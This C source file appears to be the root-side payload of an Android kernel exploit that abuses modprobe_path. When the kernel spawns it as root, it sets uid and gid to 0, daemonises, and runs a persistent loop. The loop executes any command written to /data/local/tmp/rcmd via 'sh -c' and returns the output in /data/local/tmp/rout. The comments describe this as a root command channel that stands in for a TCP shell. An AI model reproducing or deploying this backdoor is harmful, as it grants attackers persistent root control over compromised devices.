/* mphelper.c — modprobe_path helper (test). Runs as root via
 * call_usermodehelper(modprobe_path) when a process execs a bad-magic file.
 *
 * Socket I/O is unreliable in this kernel-spawned context, so instead of a TCP
 * shell we run a FILE-DRIVEN root command loop:
 *   we write a command to /data/local/tmp/rcmd  ->
 *   helper runs `sh -c <cmd>` as root, output -> /data/local/tmp/rout
 * The helper can write /data fine (root creds), which makes this a usable root
 * command channel.
 */
#include "common.h"
#include <sys/wait.h>
#include <stdio.h>

int main(int argc, char **argv) {
  (void)argc; (void)argv;
  setgid(0);
  setuid(0);

  int f = open("/data/local/tmp/mp_ran", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (f >= 0) {
    char b[128];
    int n = snprintf(b, sizeof(b), "mphelper uid=%d euid=%d gid=%d pid=%d\n",
                     getuid(), geteuid(), getgid(), getpid());
    if (n > 0) {
      ssize_t w = write(f, b, n);
      (void)w;
    }
    close(f);
  }

  pid_t d = fork();
  if (d == 0) {
    setsid();
    for (;;) {
      int rf = open("/data/local/tmp/rcmd", O_RDONLY);
      if (rf >= 0) {
        char cmd[1024];
        ssize_t n = read(rf, cmd, sizeof(cmd) - 1);
        close(rf);
        if (n > 0) {
          cmd[n] = 0;
          int of = open("/data/local/tmp/rout", O_WRONLY | O_CREAT | O_TRUNC, 0644);
          pid_t p = fork();
          if (p == 0) {
            if (of >= 0) { dup2(of, 1); dup2(of, 2); }
            execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
          }
          if (of >= 0) close(of);
          waitpid(p, NULL, 0);
          int tf = open("/data/local/tmp/rcmd", O_WRONLY | O_TRUNC);
          if (tf >= 0) close(tf);
        }
      }
      usleep(300000);
    }
  }
  return 0; /* parent exits so call_modprobe() returns */
}
